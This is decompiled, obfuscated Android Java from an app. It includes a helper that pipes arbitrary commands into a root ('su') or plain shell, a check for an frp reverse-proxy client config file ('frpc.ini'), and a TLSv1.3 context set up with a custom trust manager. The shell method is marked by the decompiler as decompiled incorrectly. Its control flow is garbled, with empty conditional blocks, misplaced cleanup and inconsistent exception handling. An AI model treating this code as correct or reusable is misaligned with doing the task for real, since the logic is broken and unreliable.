    /* renamed from: u */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static CommandResult m188u(String[] strArr, boolean z2, boolean z3) {
        Throwable th;
        BufferedReader bufferedReader;
        Process process;
        BufferedReader bufferedReader2;
        DataOutputStream dataOutputStream;
        Exception e2;
        DataOutputStream dataOutputStream2 = null;
        BufferedReader bufferedReader3 = null;
        BufferedReader bufferedReader4 = null;
        dataOutputStream2 = null;
        int i2 = -1;
        if (strArr.length == 0) {
            return new CommandResult(-1, null, null);
        }
        LinkedList linkedList = new LinkedList();
        LinkedList linkedList2 = new LinkedList();
        try {
            process = Runtime.getRuntime().exec(z2 ? "su" : "sh");
        } catch (Exception e3) {
            process = null;
            bufferedReader2 = null;
            dataOutputStream = null;
            e2 = e3;
            bufferedReader = null;
        } catch (Throwable th2) {
            th = th2;
            bufferedReader = null;
            process = null;
            bufferedReader2 = null;
        }
        try {
            dataOutputStream = new DataOutputStream(process.getOutputStream());
            try {
                for (String str : strArr) {
                    if (str != null) {
                        dataOutputStream.write(str.getBytes());
                        dataOutputStream.writeBytes("\n");
                        dataOutputStream.flush();
                    }
                }
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                i2 = process.waitFor();
                if (z3) {
                    bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    try {
                        bufferedReader2 = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                        while (true) {
                            try {
                                String readLine = bufferedReader.readLine();
                                if (readLine == null) {
                                    break;
                                }
                                linkedList.add(readLine);
                            } catch (Exception e4) {
                                e2 = e4;
                                try {
                                    m186s("ShellUtils", e2);
                                    if (dataOutputStream != null) {
                                        try {
                                            dataOutputStream.close();
                                        } catch (IOException e5) {
                                            m186s("ShellUtils", e5);
                                        }
                                    }
                                    if (bufferedReader != null) {
                                        bufferedReader.close();
                                    }
                                    if (bufferedReader2 != null) {
                                        bufferedReader2.close();
                                    }
                                } catch (Throwable th3) {
                                    th = th3;
                                    dataOutputStream2 = dataOutputStream;
                                    if (dataOutputStream2 != null) {
                                        try {
                                            dataOutputStream2.close();
                                        } catch (IOException e6) {
                                            m186s("ShellUtils", e6);
                                            if (process != null) {
                                                throw th;
                                            }
                                            process.destroy();
                                            throw th;
                                        }
                                    }
                                    if (bufferedReader != null) {
                                        bufferedReader.close();
                                    }
                                    if (bufferedReader2 != null) {
                                        bufferedReader2.close();
                                    }
                                    if (process != null) {
                                    }
                                }
                            } catch (Throwable th4) {
                                th = th4;
                                bufferedReader4 = bufferedReader;
                                bufferedReader = bufferedReader4;
                                dataOutputStream2 = dataOutputStream;
                                if (dataOutputStream2 != null) {
                                }
                                if (bufferedReader != null) {
                                }
                                if (bufferedReader2 != null) {
                                }
                                if (process != null) {
                                }
                            }
                        }
                        while (true) {
                            String readLine2 = bufferedReader2.readLine();
                            if (readLine2 == null) {
                                break;
                            }
                            linkedList2.add(readLine2);
                        }
                        bufferedReader3 = bufferedReader;
                    } catch (Exception e7) {
                        e2 = e7;
                        bufferedReader2 = null;
                    } catch (Throwable th5) {
                        th = th5;
                        bufferedReader2 = null;
                    }
                } else {
                    bufferedReader2 = null;
                }
                try {
                    dataOutputStream.close();
                    if (bufferedReader3 != null) {
                        bufferedReader3.close();
                    }
                    if (bufferedReader2 != null) {
                        bufferedReader2.close();
                    }
                } catch (IOException e8) {
                    m186s("ShellUtils", e8);
                }
            } catch (Exception e9) {
                e = e9;
                bufferedReader2 = null;
                e2 = e;
                bufferedReader = null;
                m186s("ShellUtils", e2);
                if (dataOutputStream != null) {
                }
                if (bufferedReader != null) {
                }
                if (bufferedReader2 != null) {
                }
            } catch (Throwable th6) {
                th = th6;
                bufferedReader2 = null;
            }
        } catch (Exception e10) {
            e = e10;
            dataOutputStream = null;
        } catch (Throwable th7) {
            th = th7;
            bufferedReader = null;
            bufferedReader2 = null;
            if (dataOutputStream2 != null) {
            }
            if (bufferedReader != null) {
            }
            if (bufferedReader2 != null) {
            }
            if (process != null) {
            }
        }
        process.destroy();
        return new CommandResult(i2, linkedList, linkedList2);
    }

    /* renamed from: v */
    public static boolean m189v(String str) {
        return m190w(str + "/frpc.ini");
    }

    /* renamed from: w */
    public static boolean m190w(String str) {
        File file = new File(str);
        if (!file.exists() || !file.isFile()) {
            return false;
        }
        Log.d("FileUtils", str + " 文件存在");
        return true;
    }

    /* renamed from: x */
    public static String m191x(String str) {
        int lastIndexOf;
        if (m151B(str) || (lastIndexOf = str.lastIndexOf("/")) == -1) {
            return null;
        }
        return str.substring(lastIndexOf + 1);
    }

    /* renamed from: y */
    public static SSLContext m192y(C0089k c0089k) {
        SSLContext sSLContext = f64j;
        if (sSLContext != null) {
            return sSLContext;
        }
        try {
            int i2 = OpenSSLProvider.f1662a;
            f64j = SSLContext.getInstance("TLSv1.3", (Provider) OpenSSLProvider.class.newInstance());
            f63i = true;
        } catch (NoSuchAlgorithmException e2) {
            throw e2;
        } catch (Throwable unused) {
            if (Build.VERSION.SDK_INT < 29) {
                throw new NoSuchAlgorithmException("TLSv1.3 isn't supported on your platform. Use custom Conscrypt library instead.");
            }
            f64j = SSLContext.getInstance("TLSv1.3");
            f63i = false;
        }
        PrintStream printStream = System.out;
        StringBuilder sb = new StringBuilder("Using ");
        sb.append(f63i ? "custom" : "default");
        sb.append(" TLSv1.3 provider...");
        printStream.println(sb.toString());
        f64j.init(new KeyManager[]{new C0095q(c0089k)}, new X509TrustManager[]{new C0096r()}, new SecureRandom());
        return f64j;
    }

    /* renamed from: z */
    public static boolean m193z() {
        C0177a c0177a = f59e;
        return c0177a != null && c0177a.f194w.get();
    }

    /* renamed from: V */
    public abstract void mo194V(InterfaceC0015f interfaceC0015f);

    /* renamed from: f */
    public abstract List mo195f(String str, List list);

    /* renamed from: i */
    public abstract long mo196i();

    /* renamed from: j */
    public abstract C0882x mo197j();
}
